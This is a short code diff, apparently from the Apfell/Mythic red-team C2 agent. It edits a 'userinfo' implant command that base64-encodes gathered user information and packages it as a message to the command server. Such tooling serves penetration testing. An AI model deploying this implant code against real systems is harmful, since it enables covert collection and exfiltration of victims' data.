@@ -4,7 +4,7 @@ userinfo = function(params) {
             sendError(taskid, tasktype);
         } else {
             const data = btoa(unescape(encodeURIComponent((JSON.stringify(info)))));
-            const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, data);
+            const apfellMsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
             let meta = {};
             meta["metatype"] = 3;
             meta["metadata"] = apfellMsg;
@@ -15,4 +15,4 @@ userinfo = function(params) {
 };
 
 C2.commands[userinfo.name] = userinfo;
-
+COMMAND_ENDS_HERE
